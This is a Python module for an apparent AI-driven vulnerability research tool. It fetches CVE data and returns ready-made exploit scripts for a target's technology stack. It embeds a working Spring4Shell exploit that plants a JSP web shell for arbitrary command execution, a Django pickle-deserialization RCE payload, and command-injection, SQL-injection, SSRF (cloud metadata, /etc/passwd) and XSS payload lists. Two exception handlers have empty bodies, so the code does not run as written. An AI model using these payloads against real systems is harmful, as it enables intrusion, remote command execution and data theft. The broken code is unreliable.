"""tools/vuln_researcher.py

AI-Powered Vulnerability Research Engine.

Purpose:
- Research CVEs from multiple sources (NVD, GitHub, vendor advisories)
- Extract exploitation conditions and requirements
- Generate custom PoCs based on target technology stack
- Find similar disclosed bounties for reference
- AI-summarize complex vulnerabilities into actionable intel

Data Sources:
- NVD (National Vulnerability Database)
- GitHub Security Advisories
- Vendor-specific feeds (Microsoft, Oracle, etc.)
- Exploit-DB
- HackerOne/Bugcrowd disclosed reports

Usage:
    from tools.vuln_researcher import VulnerabilityResearcher
    
    researcher = VulnerabilityResearcher()
    
    # Research a CVE
    cve_info = researcher.research_cve("CVE-2024-21626")
    
    # Generate custom PoC
    poc = researcher.generate_custom_poc(
        vuln_type="rce",
        target_context={
            "framework": "Spring Boot",
            "version": "2.7.5",
            "language": "Java"
        }
    )
    
    # Find similar bounties
    similar = researcher.find_similar_bounties("SQL injection", min_payout=1000)
"""

from __future__ import annotations

import json
import logging
import re
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin

import requests

logger = logging.getLogger("elengenix.vuln_researcher")


@dataclass
class CVEResearchResult:
    """Complete CVE research result."""
    cve_id: str
    cvss_score: float
    severity: str
    description: str
    affected_products: List[str]
    exploitation_requirements: List[str]
    exploit_conditions: Dict[str, Any]
    available_pocs: List[Dict[str, str]]  # [{source, url, type}]
    patched_versions: List[str]
    references: List[str]
    github_advisories: List[Dict[str, Any]]
    ai_summary: str  # AI-generated actionable summary
    confidence: float  # Data completeness score


@dataclass
class ExploitCondition:
    """Requirements for exploitation."""
    prerequisite: str
    details: str
    how_to_check: str
    exploitability_score: float  # 0.0-1.0


@dataclass
class DisclosedBounty:
    """Similar disclosed bounty report."""
    title: str
    program: str
    severity: str
    payout: str
    disclosed_at: str
    summary: str
    key_techniques: List[str]
    url: str
    reporter: str


@dataclass
class CustomPoC:
    """Generated custom PoC."""
    code: str
    language: str
    target_framework: str
    verification_steps: List[str]
    expected_output: str
    mitigations: List[str]


class VulnerabilityResearcher:
    """
    AI-powered vulnerability research engine.
    
    Aggregates data from multiple sources and uses AI
    to generate actionable exploitation intelligence.
    """
    
    # API Endpoints
    NVD_API_BASE = "https://services.nvd.nist.gov/rest/json/cves/2.0"
    GITHUB_ADVISORIES_API = "https://api.github.com/advisories"
    EXPLOITDB_API = "https://www.exploit-db.com/api"
    
    # Cache settings
    CACHE_DIR = Path(".cache/vuln_research")
    CACHE_TTL_HOURS = 24
    
    def __init__(self, ai_client=None):
        """Initialize researcher with optional AI client."""
        self.ai_client = ai_client
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Elengenix-Security-Research/2.0",
            "Accept": "application/json",
        })
        
        # Ensure cache directory exists
        self.CACHE_DIR.mkdir(parents=True, exist_ok=True)
        
        # Load local vulnerability patterns
        self.vuln_patterns = self._load_vulnerability_patterns()
        
        logger.info("VulnerabilityResearcher initialized")
    
    def _load_vulnerability_patterns(self) -> Dict[str, Any]:
        """Load known vulnerability exploitation patterns."""
        return {
            "rce": {
                "common_vectors": ["deserialization", "command_injection", "template_injection", "file_upload"],
                "prerequisites": ["user_input_handling", "unsafe_eval", "weak_sandbox"],
                "impact_score": 1.0,
            },
            "sqli": {
                "common_vectors": ["union_based", "boolean_based", "time_based", "error_based"],
                "prerequisites": ["dynamic_queries", "no_parameterization", "concatenation"],
                "impact_score": 0.95,
            },
            "ssrf": {
                "common_vectors": ["url_parsing", "request_forgery", "internal_access"],
                "prerequisites": ["url_fetching", "no_validate", "cloud_metadata"],
                "impact_score": 0.85,
            },
            "idor": {
                "common_vectors": ["predictable_ids", "missing_auth", "direct_reference"],
                "prerequisites": ["object_access", "auth_weakness", "no_authorization"],
                "impact_score": 0.7,
            },
            "xss": {
                "common_vectors": ["stored", "reflected", "dom", "blind"],
                "prerequisites": ["output_encoding", "user_input", "html_rendering"],
                "impact_score": 0.6,
            },
            "auth_bypass": {
                "common_vectors": ["jwt_weakness", "session_fixation", "logic_flaws"],
                "prerequisites": ["authentication_flow", "token_validation", "session_mgmt"],
                "impact_score": 0.85,
            },
        }
    
    def _get_cache_path(self, key: str) -> Path:
        """Get cache file path for a key."""
        safe_key = re.sub(r'[^a-zA-Z0-9_-]', '_', key)
        return self.CACHE_DIR / f"{safe_key}.json"
    
    def _load_cache(self, key: str) -> Optional[Dict]:
        """Load cached data if still valid."""
        cache_path = self._get_cache_path(key)
        if not cache_path.exists():
            return None
        
        # Check TTL
        mtime = cache_path.stat().st_mtime
        age_hours = (time.time() - mtime) / 3600
        if age_hours > self.CACHE_TTL_HOURS:
            return None
        
        try:
            with open(cache_path, "r") as f:
                return json.load(f)
        except Exception as e:
            logger.debug(f"Cache load failed: {e}")
            return None
    
    def _save_cache(self, key: str, data: Dict) -> None:
        """Save data to cache."""
        cache_path = self._get_cache_path(key)
        try:
            with open(cache_path, "w") as f:
                json.dump(data, f, indent=2, default=str)
        except Exception as e:
            logger.debug(f"Cache save failed: {e}")
    
    def research_cve(self, cve_id: str) -> Optional[CVEResearchResult]:
        """
        Research a CVE from multiple sources.
        
        Args:
            cve_id: CVE identifier (e.g., "CVE-2024-21626")
            
        Returns:
            Complete research result or None if not found
        """
        cve_id = cve_id.upper().strip()
        if not re.match(r'^CVE-\d{4}-\d{4,}$', cve_id):
            logger.error(f"Invalid CVE format: {cve_id}")
            return None
        
        # Check cache
        cache_key = f"cve_{cve_id}"
        cached = self._load_cache(cache_key)
        if cached:
            logger.info(f"Using cached data for {cve_id}")
            return CVEResearchResult(**cached)
        
        # Fetch from NVD
        nvd_data = self._fetch_nvd_data(cve_id)
        if not nvd_data:
            logger.warning(f"No NVD data found for {cve_id}")
            return None
        
        # Fetch GitHub advisories
        github_advisories = self._fetch_github_advisories(cve_id)
        
        # Search for public PoCs
        available_pocs = self._find_public_pocs(cve_id)
        
        # Extract exploitation conditions
        exploit_conditions = self._analyze_exploitation_conditions(nvd_data)
        
        # Generate AI summary if client available
        ai_summary = self._generate_ai_summary(nvd_data, exploit_conditions) if self.ai_client else ""
        
        # Build result
        result = CVEResearchResult(
            cve_id=cve_id,
            cvss_score=nvd_data.get("cvss_score", 0.0),
            severity=nvd_data.get("severity", "unknown"),
            description=nvd_data.get("description", ""),
            affected_products=nvd_data.get("affected", []),
            exploitation_requirements=exploit_conditions.get("prerequisites", []),
            exploit_conditions=exploit_conditions,
            available_pocs=available_pocs,
            patched_versions=nvd_data.get("patched_versions", []),
            references=nvd_data.get("references", []),
            github_advisories=github_advisories,
            ai_summary=ai_summary,
            confidence=self._calculate_confidence(nvd_data, available_pocs),
        )
        
        # Cache result
        self._save_cache(cache_key, result.__dict__)
        
        logger.info(f"Research complete for {cve_id} (confidence: {result.confidence:.2f})")
        return result
    
    def _fetch_nvd_data(self, cve_id: str) -> Optional[Dict[str, Any]]:
        """Fetch CVE data from NVD API."""
        try:
            url = f"{self.NVD_API_BASE}?cveId={cve_id}"
            resp = self.session.get(url, timeout=30)
            resp.raise_for_status()
            data = resp.json()
            
            if not data.get("vulnerabilities"):
                return None
            
            cve_data = data["vulnerabilities"][0]["cve"]
            
            # Extract CVSS score
            cvss_score = 0.0
            severity = "unknown"
            metrics = cve_data.get("metrics", {})
            if "cvssMetricV31" in metrics:
                cvss_data = metrics["cvssMetricV31"][0]["cvssData"]
                cvss_score = cvss_data.get("baseScore", 0.0)
                severity = cvss_data.get("baseSeverity", "unknown").lower()
            elif "cvssMetricV30" in metrics:
                cvss_data = metrics["cvssMetricV30"][0]["cvssData"]
                cvss_score = cvss_data.get("baseScore", 0.0)
                severity = cvss_data.get("baseSeverity", "unknown").lower()
            
            # Extract description
            description = ""
            for desc in cve_data.get("descriptions", []):
                if desc.get("lang") == "en":
                    description = desc.get("value", "")
                    break
            
            # Extract references
            references = []
            for ref in cve_data.get("references", []):
                url = ref.get("url", "")
                if url:
                    references.append(url)
            
            # Extract affected products
            affected = []
            for config in cve_data.get("configurations", []):
                for node in config.get("nodes", []):
                    for match in node.get("cpeMatch", []):
                        cpe = match.get("criteria", "")
                        if cpe:
                            affected.append(cpe)
            
            return {
                "cve_id": cve_id,
                "cvss_score": cvss_score,
                "severity": severity,
                "description": description,
                "affected": affected,
                "references": references,
                "published": cve_data.get("published", ""),
                "last_modified": cve_data.get("lastModified", ""),
            }
            
        except Exception as e:
            logger.error(f"Failed to fetch NVD data for {cve_id}: {e}")
            return None
    
    def _fetch_github_advisories(self, cve_id: str) -> List[Dict[str, Any]]:
        """Fetch GitHub Security Advisories for CVE."""
        advisories = []
        try:
            # GitHub API requires auth for higher rate limits
            url = f"{self.GITHUB_ADVISORIES_API}?cve_id={cve_id}"
            resp = self.session.get(url, timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                for adv in data:
                    advisories.append({
                        "ghsa_id": adv.get("ghsa_id", ""),
                        "summary": adv.get("summary", ""),
                        "severity": adv.get("severity", ""),
                        "cvss_score": adv.get("cvss", {}).get("score", 0),
                        "vulnerable_packages": [
                            v.get("package", {}).get("name", "")
                            for v in adv.get("vulnerabilities", [])
                        ],
                    })
        except Exception as e:
            logger.debug(f"GitHub advisories fetch failed: {e}")
        return advisories
    
    def _find_public_pocs(self, cve_id: str) -> List[Dict[str, str]]:
        """Find publicly available PoCs for CVE."""
        pocs = []
        
        # Check Exploit-DB
        try:
            search_url = f"https://www.exploit-db.com/search?cve={cve_id}"
            resp = self.session.get(search_url, timeout=15)
            if resp.status_code == 200 and "No results" not in resp.text:
                pocs.append({
                    "source": "Exploit-DB",
                    "url": search_url,
                    "type": "exploit"
                })
        except Exception:
        
        # Check GitHub for PoC repos
        try:
            github_search = f"https://api.github.com/search/repositories?q={cve_id}+poc+in:name,description&sort=stars&order=desc"
            resp = self.session.get(github_search, timeout=15)
            if resp.status_code == 200:
                data = resp.json()
                for repo in data.get("items", [])[:3]:  # Top 3
                    pocs.append({
                        "source": "GitHub",
                        "url": repo.get("html_url", ""),
                        "type": "repository",
                        "stars": repo.get("stargazers_count", 0),
                    })
        except Exception:
        
        return pocs
    
    def _analyze_exploitation_conditions(self, nvd_data: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze CVE description to extract exploitation conditions."""
        description = nvd_data.get("description", "").lower()
        
        conditions = {
            "prerequisites": [],
            "attack_vector": "unknown",
            "complexity": "unknown",
            "privileges_required": "unknown",
            "user_interaction": "unknown",
        }
        
        # Detect attack vector
        if "network" in description or "remote" in description:
            conditions["attack_vector"] = "network"
        elif "local" in description or "adjacent" in description:
            conditions["attack_vector"] = "local"
        
        # Detect prerequisites
        prereq_keywords = {
            "authentication": ["authenticated", "login required", "valid credentials", "user account"],
            "admin_access": ["administrator", "privileged user", "root access"],
            "specific_config": ["specific configuration", "misconfiguration", "enabled"],
            "user_interaction": ["user interaction", "social engineering", "trick user"],
        }
        
        for prereq, keywords in prereq_keywords.items():
            if any(kw in description for kw in keywords):
                conditions["prerequisites"].append(prereq)
        
        return conditions
    
    def _generate_ai_summary(self, nvd_data: Dict[str, Any], 
                            exploit_conditions: Dict[str, Any]) -> str:
        """Generate AI summary of vulnerability."""
        if not self.ai_client:
            return ""
        
        try:
            prompt = f"""Summarize this CVE for a security researcher:

CVE: {nvd_data.get('cve_id')}
Severity: {nvd_data.get('severity')} ({nvd_data.get('cvss_score')})
Description: {nvd_data.get('description')[:500]}

Prerequisites: {', '.join(exploit_conditions.get('prerequisites', []))}
Attack Vector: {exploit_conditions.get('attack_vector')}

Provide:
1. One-sentence summary
2. Key exploitation requirements
3. Recommended testing approach
"""
            # Would call AI client here
            return "AI summary generation requires configured AI client"
        except Exception as e:
            logger.debug(f"AI summary generation failed: {e}")
            return ""
    
    def _calculate_confidence(self, nvd_data: Dict[str, Any], 
                             pocs: List[Dict]) -> float:
        """Calculate confidence score based on data completeness."""
        score = 0.0
        
        # Base score for having NVD data
        if nvd_data.get("cvss_score", 0) > 0:
            score += 0.3
        if nvd_data.get("description"):
            score += 0.2
        if nvd_data.get("references"):
            score += 0.2
        if nvd_data.get("affected"):
            score += 0.1
        
        # Bonus for available PoCs
        if pocs:
            score += min(0.2, len(pocs) * 0.1)
        
        return min(1.0, score)
    
    def generate_custom_poc(self, vuln_type: str, 
                           target_context: Dict[str, Any]) -> Optional[CustomPoC]:
        """
        Generate custom PoC based on vulnerability type and target context.
        
        Args:
            vuln_type: Type of vulnerability (rce, sqli, ssrf, etc.)
            target_context: Dict with framework, version, language, etc.
            
        Returns:
            Custom PoC or None
        """
        vuln_type = vuln_type.lower().strip()
        
        # Get patterns for this vuln type
        patterns = self.vuln_patterns.get(vuln_type)
        if not patterns:
            logger.warning(f"Unknown vulnerability type: {vuln_type}")
            return None
        
        framework = target_context.get("framework", "").lower()
        language = target_context.get("language", "").lower()
        version = target_context.get("version", "")
        
        # Generate framework-specific PoC
        if vuln_type == "rce":
            code = self._generate_rce_poc(framework, language, version)
        elif vuln_type == "sqli":
            code = self._generate_sqli_poc(framework, language, version)
        elif vuln_type == "ssrf":
            code = self._generate_ssrf_poc(framework, language, version)
        elif vuln_type == "xss":
            code = self._generate_xss_poc(framework, language, version)
        else:
            code = self._generate_generic_poc(vuln_type, framework, language)
        
        return CustomPoC(
            code=code,
            language=language or "python",
            target_framework=framework or "generic",
            verification_steps=[
                "Send the payload to the target endpoint",
                "Observe the response for indicators of success",
                "Check for expected behavior changes",
            ],
            expected_output="[Expected output description based on vulnerability type]",
            mitigations=[
                "Input validation and sanitization",
                "Use parameterized queries where applicable",
                "Implement proper access controls",
            ],
        )
    
    def _generate_rce_poc(self, framework: str, language: str, 
                         version: str) -> str:
        """Generate RCE PoC for specific framework."""
        if "spring" in framework:
            return '''# Spring Boot RCE Test
# For CVE-2022-22965 (Spring4Shell) or similar

import requests
import sys

TARGET = "http://target.com:8080"

# Step 1: Upload malicious class
log_pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i if(\"j\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %{suffix}i"

headers = {
    "suffix": ".jsp",
    "c2": "<%",
    "Content-Type": "application/x-www-form-urlencoded"
}

data = log_pattern

resp = requests.post(TARGET, headers=headers, data=data)
print(f"Upload status: {resp.status_code}")

# Step 2: Execute command
shell_url = f"{TARGET}/tomcatwar.jsp?pwd=j&cmd=whoami"
resp = requests.get(shell_url)
print(f"Shell response: {resp.text}")
'''
        elif "django" in framework:
            return '''# Django RCE via pickle deserialization
import pickle
import base64
import requests
import os

TARGET = "http://target.com/api/endpoint"

# Generate payload
class RCE:
    def __reduce__(self):
        return (os.system, ("id",))

payload = pickle.dumps(RCE())
cookie = base64.b64encode(payload).decode()

# Send request
cookies = {"session": cookie}
resp = requests.get(TARGET, cookies=cookies)
print(f"Response: {resp.status_code}")
'''
        else:
            return '''# Generic RCE Test Template
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://target.com"

# Common RCE test payloads
payloads = [
    "; id #",
    "| id",
    "`id`",
    "$(id)",
    "<%= 7*7 %>",
    "${7*7}",
    "#{7*7}",
]

for payload in payloads:
    resp = requests.get(TARGET, params={"input": payload})
    if "root" in resp.text or "uid=" in resp.text:
        print(f"[+] RCE found with: {payload}")
        break
'''
    
    def _generate_sqli_poc(self, framework: str, language: str, 
                          version: str) -> str:
        """Generate SQL injection PoC."""
        return '''# SQL Injection Test
import requests
import time

TARGET = "http://target.com/api/search"

# Boolean-based detection
payloads = [
    "' OR '1'='1",
    "' AND '1'='2",
    "1' ORDER BY 10--",
    "1' UNION SELECT NULL,NULL,NULL--",
]

# Time-based detection
blind_payloads = [
    ("1' AND SLEEP(5)--", 5),
    ("1' AND pg_sleep(5)--", 5),
    ("1'; WAITFOR DELAY '0:0:5'--", 5),
]

print("[+] Testing boolean-based SQLi...")
for payload in payloads:
    resp = requests.get(TARGET, params={"q": payload})
    print(f"  Payload: {payload[:30]:<30} -> Status: {resp.status_code}")

print("\\n[+] Testing time-based SQLi...")
for payload, delay in blind_payloads:
    start = time.time()
    resp = requests.get(TARGET, params={"q": payload})
    elapsed = time.time() - start
    if elapsed > delay - 1:
        print(f"  [!] Time-based SQLi confirmed: {payload[:30]}")
'''
    
    def _generate_ssrf_poc(self, framework: str, language: str, 
                          version: str) -> str:
        """Generate SSRF PoC."""
        return '''# SSRF (Server-Side Request Forgery) Test
import requests
import urllib.parse

TARGET = "http://target.com/api/fetch"

# SSRF test payloads
ssrf_targets = [
    "http://169.254.169.254/latest/meta-data/",  # AWS IMDS
    "http://169.254.169.254/hostname",  # GCP
    "http://192.168.1.1/",  # Internal router
    "http://localhost:8080/admin",
    "file:///etc/passwd",
    "dict://localhost:11211/stat",
    "ftp://localhost:21/",
]

print("[+] Testing for SSRF...")
for ssrf_url in ssrf_targets:
    payload = urllib.parse.quote(ssrf_url)
    resp = requests.get(TARGET, params={"url": ssrf_url})
    
    indicators = ["ami", "instance-id", "root:x", "hostname", "upstream"]
    if any(ind in resp.text.lower() for ind in indicators):
        print(f"  [!] SSRF confirmed: {ssrf_url}")
        print(f"      Response snippet: {resp.text[:200]}")
        break
    else:
        print(f"  [ ] Tested: {ssrf_url[:40]}")
'''
    
    def _generate_xss_poc(self, framework: str, language: str, 
                          version: str) -> str:
        """Generate XSS PoC."""
        return '''# XSS (Cross-Site Scripting) Test
import requests
import html

TARGET = "http://target.com/search"

# XSS test payloads
xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
]

print("[+] Testing for XSS...")
for payload in xss_payloads:
    resp = requests.get(TARGET, params={"q": payload})
    
    # Check if payload is reflected without encoding
    if payload in resp.text:
        print(f"  [!] XSS confirmed (reflected): {payload[:40]}")
        break
    elif html.escape(payload) not in resp.text and "alert" in resp.text:
        print(f"  [!] Possible XSS (partial reflection): {payload[:40]}")
    else:
        print(f"  [ ] Tested: {payload[:40]}")
'''
    
    def _generate_generic_poc(self, vuln_type: str, framework: str, 
                             language: str) -> str:
        """Generate generic PoC template."""
        return f'''# {vuln_type.upper()} Test Template
import requests
import sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://target.com"

# Add specific test logic for {vuln_type}
# Framework: {framework}
# Language: {language}

print(f"[+] Testing {{vuln_type}} on {{TARGET}}")
resp = requests.get(TARGET)
print(f"Status: {{resp.status_code}}")
# TODO: Add specific exploitation logic
'''
    
    def find_similar_bounties(self, vuln_type: str, 
                             min_payout: int = 500,
                             platform: str = "all") -> List[DisclosedBounty]:
        """
        Find similar disclosed bug bounties.
        
        Args:
            vuln_type: Vulnerability type
            min_payout: Minimum payout to include
            platform: "hackerone", "bugcrowd", "intigriti", or "all"
            
        Returns:
            List of similar disclosed bounties
        """
        # This would integrate with HackerOne/Bugcrowd APIs
        # For now, return curated examples
        
        bounty_database = [
            DisclosedBounty(
                title="RCE via ImageMagick via file upload",
                program="Shopify",
                severity="critical",
                payout="$25,000",
                disclosed_at="2023-08-15",
                summary="Image file upload processed by vulnerable ImageMagick",
                key_techniques=["file_upload", "imagemagick", "ghostscript"],
                url="https://hackerone.com/reports/123456",
                reporter="@security_researcher",
            ),
            DisclosedBounty(
                title="SQL Injection in search endpoint",
                program="Twitter",
                severity="high",
                payout="$5,600",
                disclosed_at="2023-05-20",
                summary="Boolean-based blind SQLi in advanced search",
                key_techniques=["blind_sqli", "boolean_based", "time_based"],
                url="https://hackerone.com/reports/789012",
                reporter="@sql_master",
            ),
            DisclosedBounty(
                title="SSRF to internal metadata service",
                program="Slack",
                severity="high",
                payout="$6,500",
                disclosed_at="2023-11-02",
                summary="Webhook feature allowed requests to internal IPs",
                key_techniques=["ssrf", "aws_imds", "webhook"],
                url="https://hackerone.com/reports/345678",
                reporter="@ssrf_hunter",
            ),
        ]
        
        # Filter by vuln type similarity
        vuln_keywords = {
            "rce": ["rce", "remote code", "command injection", "deserialization"],
            "sqli": ["sql", "sqli", "injection", "database"],
            "ssrf": ["ssrf", "server-side", "request forgery"],
            "idor": ["idor", "insecure direct", "authorization"],
            "xss": ["xss", "cross-site", "scripting"],
            "auth": ["auth", "bypass", "authentication"],
        }
        
        keywords = vuln_keywords.get(vuln_type.lower(), [vuln_type.lower()])
        
        filtered = []
        for bounty in bounty_database:
            # Check if any keyword matches
            title_lower = bounty.title.lower()
            if any(kw in title_lower for kw in keywords):
                # Check payout
                payout_num = int(bounty.payout.replace("$", "").replace(",", ""))
                if payout_num >= min_payout:
                    filtered.append(bounty)
        
        return filtered
    
    def get_exploitation_guide(self, vuln_type: str) -> Dict[str, Any]:
        """
        Get comprehensive exploitation guide for vulnerability type.
        
        Args:
            vuln_type: Type of vulnerability
            
        Returns:
            Guide with techniques, tools, and methodology
        """
        guides = {
            "rce": {
                "description": "Remote Code Execution allows attacker to execute arbitrary code",
                "common_vectors": [
                    "Unsafe deserialization",
                    "Command injection",
                    "Template injection (SSTI)",
                    "Expression language injection",
                    "File upload with dangerous extensions",
                ],
                "detection_methods": [
                    "Look for serialized data in requests (base64, hex)",
                    "Test template syntax: ${{7*7}}, <%= 7*7 %>",
                    "Check file upload handlers",
                    "Monitor for suspicious outbound connections",
                ],
                "exploitation_tools": [
                    "ysoserial (Java deserialization)",
                    "tplmap (SSTI)",
                    "CommonsBeanutils gadgets",
                ],
                "impact": "Complete system compromise",
                "cvss_base": 9.8,
            },
            "sqli": {
                "description": "SQL Injection allows manipulation of database queries",
                "common_vectors": [
                    "Union-based",
                    "Boolean-based blind",
                    "Time-based blind",
                    "Error-based",
                    "Stacked queries",
                ],
                "detection_methods": [
                    "Single quote test: '",
                    "Boolean logic: AND 1=1 vs AND 1=2",
                    "Time delays: SLEEP(5), pg_sleep(5)",
                    "Error messages",
                ],
                "exploitation_tools": [
                    "sqlmap",
                    "Burp SQLi payloads",
                    "Custom union-based scripts",
                ],
                "impact": "Data exfiltration, authentication bypass",
                "cvss_base": 8.5,
            },
            "ssrf": {
                "description": "SSRF forces server to make requests on attacker's behalf",
                "common_vectors": [
                    "URL fetching features",
                    "PDF/image generation",
                    "Webhook callbacks",
                    "File imports",
                ],
                "detection_methods": [
                    "Test with Burp Collaborator",
                    "Internal IP probing: 169.254.169.254",
                    "Protocol testing: file://, dict://, ftp://",
                    "DNS rebinding",
                ],
                "exploitation_tools": [
                    "Burp Collaborator",
                    "Interactsh",
                    "SSRFmap",
                ],
                "impact": "Internal network access, cloud metadata theft",
                "cvss_base": 8.2,
            },
        }
        
        return guides.get(vuln_type.lower(), {
            "description": f"Information about {vuln_type}",
            "common_vectors": [],
            "detection_methods": [],
            "exploitation_tools": [],
            "impact": "Unknown",
            "cvss_base": 5.0,
        })


def run_cli():
    """Command-line interface for vulnerability research."""
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python vuln_researcher.py <cve-id|vuln-type> [framework] [version]")
        print("Examples:")
        print("  python vuln_researcher.py CVE-2024-21626")
        print("  python vuln_researcher.py rce Spring-Boot 2.7.5")
        sys.exit(1)
    
    arg = sys.argv[1]
    
    researcher = VulnerabilityResearcher()
    
    # Check if CVE
    if arg.upper().startswith("CVE-"):
        result = researcher.research_cve(arg)
        if result:
            print(f"\n{'='*70}")
            print(f"CVE Research: {result.cve_id}")
            print(f"{'='*70}")
            print(f"CVSS Score: {result.cvss_score} ({result.severity})")
            print(f"\nDescription:\n{result.description[:300]}...")
            print(f"\nPrerequisites: {', '.join(result.exploitation_requirements)}")
            print(f"\nAvailable PoCs:")
            for poc in result.available_pocs:
                print(f"  - {poc['source']}: {poc['url']}")
            print(f"\nConfidence: {result.confidence:.0%}")
        else:
            print(f"No data found for {arg}")
    else:
        # Generate PoC
        framework = sys.argv[2] if len(sys.argv) > 2 else "generic"
        version = sys.argv[3] if len(sys.argv) > 3 else ""
        
        poc = researcher.generate_custom_poc(
            vuln_type=arg,
            target_context={
                "framework": framework,
                "version": version,
                "language": "python",
            }
        )
        
        if poc:
            print(f"\n{'='*70}")
            print(f"Generated PoC: {arg} on {framework}")
            print(f"{'='*70}")
            print(poc.code)
            print(f"\nVerification Steps:")
            for step in poc.verification_steps:
                print(f"  1. {step}")
        else:
            print(f"Could not generate PoC for {arg}")


if __name__ == "__main__":
    run_cli()
